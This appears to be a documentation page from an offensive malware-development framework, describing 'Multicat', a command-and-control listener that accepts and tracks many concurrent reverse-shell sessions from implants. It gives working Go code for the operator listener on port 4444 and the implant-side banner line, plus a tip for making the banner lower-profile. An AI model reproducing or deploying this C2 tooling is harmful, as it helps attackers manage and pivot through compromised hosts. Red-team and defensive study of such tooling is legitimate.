# Multicat — Multi-Session Reverse-Shell Listener

[← Back to C2 index](README.md)

Operator-side multi-handler for reverse shells. Accepts many concurrent
connections on a single port, assigns each a sequential session ID,
and streams lifecycle events over a channel. Sessions are in-memory and
do not survive a manager restart.

- **Package:** `github.com/oioio-space/maldev/c2/multicat`
- **MITRE ATT&CK:** T1571 — Non-Standard Port
- **Platform:** cross-platform
- **Detection:** Low — never embedded in the implant; runs on the operator box.

## How it works

1. Operator calls `multicat.New()` + passes any `transport.Listener` to
   `Manager.Listen(ctx, lis)`. Works with plain TCP, TLS, uTLS, named
   pipes — whatever the transport layer exposes.
2. Each incoming connection gets a sequential `ID`, wrapped in a
   `Session` with metadata (remote address, hostname, connect time).
3. On `Accept`, the manager reads the first line with a 500 ms deadline.
   `BANNER:<hostname>\n` is parsed into `SessionMetadata.Hostname`; any
   other bytes are re-injected into the session's I/O stream.
4. Event channel (`Manager.Events()`) emits `EventOpened` / `EventClosed`
   so an operator UI can render arrivals in real time.

## Example

```go
package main

import (
    "context"
    "fmt"

    "github.com/oioio-space/maldev/c2/multicat"
    "github.com/oioio-space/maldev/c2/transport"
)

func main() {
    lis, _ := transport.NewTCPListener(":4444")
    mgr := multicat.New()

    ctx := context.Background()
    go mgr.Listen(ctx, lis)

    for ev := range mgr.Events() {
        if ev.Type == multicat.EventOpened {
            fmt.Printf("[+] session %d from %s host=%q\n",
                ev.Session.Meta.ID, ev.Session.Meta.RemoteAddr, ev.Session.Meta.Hostname)
        }
    }
}
```

The agent side (reverse shell) should emit the banner:

```go
// Inside the c2/shell agent, after Dial succeeds:
fmt.Fprintf(conn, "BANNER:%s\n", hostname)
```

## Operator workflow

```text
┌──────────────┐   TCP/TLS/namedpipe   ┌────────────────┐
│ shell agent  ├──────────────────────▶│ multicat.Manager│
│ (implant)    │  BANNER:<host>\n      │  + Listener     │
└──────────────┘  <shell I/O>          └────────────────┘
                                                │
                                                ▼ Events()
                                        ┌───────────────┐
                                        │ operator UI   │
                                        │ tracks, pivots│
                                        └───────────────┘
```

## Detection considerations

- Runs only on the attacker-controlled box — nothing shipped into the
  target process. Coverage concerns are operator hygiene, not evasion.
- If you want a "lower-profile" banner, replace `BANNER:` with any
  token your shell agent emits before normal I/O — the parser only
  looks at the first line.

## Related

- [Reverse Shell](reverse-shell.md) — the in-implant agent that connects
  to this multicat manager.
- [Transport Layer](transport.md) — how to back `multicat.Listen` with
  TLS, uTLS, or named pipes instead of plain TCP.
